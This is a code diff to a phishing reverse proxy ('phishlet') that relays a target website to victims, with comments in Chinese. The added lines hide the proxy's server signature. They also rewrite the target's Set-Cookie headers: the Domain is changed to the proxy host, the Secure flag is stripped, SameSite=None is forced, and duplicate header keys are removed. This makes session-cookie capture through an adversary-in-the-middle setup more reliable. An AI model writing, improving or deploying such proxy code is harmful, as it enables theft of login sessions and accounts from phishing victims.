@@ -77,6 +77,10 @@ def make_handler(phishlet, db_file):
     target_base = phishlet.get('target_url', f'https://{target_host}')
 
     class PhishletHandler(BaseHTTPRequestHandler):
+        # R32D90-OBS2: 匿名化自动 Server 头(类属性覆盖, 手动加头会双份)。
+        server_version = 'phishlet-proxy/1'
+        sys_version = ''
+
         def log(self, msg):
             print(f'[phishlet:{phishlet["name"]}] {msg}', flush=True)
 
@@ -162,9 +166,14 @@ def make_handler(phishlet, db_file):
             if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
                 raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                 if isinstance(raw, str):
-                    raw = re.sub(r'(?i)(domain=)' + re.escape(target_host), r'\g<1>' + proxy_host, raw)  # CS73-F4: 属性替换大小写不敏感
+                    raw = re.sub(r'(?i)(domain=)' + re.escape(target_host.split(':')[0]), r'\g<1>' + proxy_host.split(':')[0], raw)  # CS73-F4/R32D90-F1: 大小写不敏感+剥端口(Domain 属性永不含端口)
                     raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                     raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
+                    # R32D90-F1: 先删异大小写原键再设规范键——此前直赋
+                    # headers['Set-Cookie'] 在原键为 set-cookie/SET-COOKIE
+                    # 时是新增键非替换, 出站双份冲突对。
+                    for hk in [k for k in headers if k.lower() == 'set-cookie']:
+                        headers.pop(hk, None)
                     headers['Set-Cookie'] = raw
             return status, headers, body
 
